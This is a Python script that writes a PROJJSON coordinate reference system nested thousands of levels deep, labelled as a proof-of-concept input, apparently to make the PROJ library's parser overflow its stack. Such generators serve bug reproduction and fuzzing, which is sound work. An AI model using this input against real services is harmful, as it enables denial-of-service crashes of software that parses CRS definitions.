#!/usr/bin/env python3
"""
Generate a deeply nested PROJJSON DerivedGeographicCRS chain for crs_SF01_poc.
Usage: python3 crs_SF01_gen.py [depth] > input.json
Default depth: 5000
"""
import sys

depth = int(sys.argv[1]) if len(sys.argv) > 1 else 5000

base_cs = ('"coordinate_system":{"subtype":"ellipsoidal","axis":['
           '{"name":"Geodetic latitude","abbreviation":"Lat","direction":"north","unit":"degree"},'
           '{"name":"Geodetic longitude","abbreviation":"Lon","direction":"east","unit":"degree"}]}')

base = ('{"$schema":"https://proj.org/schemas/v0.7/projjson.schema.json",'
        '"type":"GeographicCRS","name":"WGS 84",'
        '"datum":{"type":"GeodeticReferenceFrame","name":"World Geodetic System 1984",'
        '"ellipsoid":{"name":"WGS 84","semi_major_axis":6378137,"inverse_flattening":298.257223563}},'
        + base_cs + '}')

conv = '"conversion":{"name":"pole_rotation","method":{"name":"PROJ ob_tran o_proj=latlong o_lon_p=0 o_lat_p=90"},"parameters":[]}'

current = base
for i in range(1, depth + 1):
    current = ('{"type":"DerivedGeographicCRS","name":"level_' + str(i) + '",'
               '"base_crs":' + current + ',' + conv + ',' + base_cs + '}')

sys.stdout.write(current)
sys.stdout.write('\n')
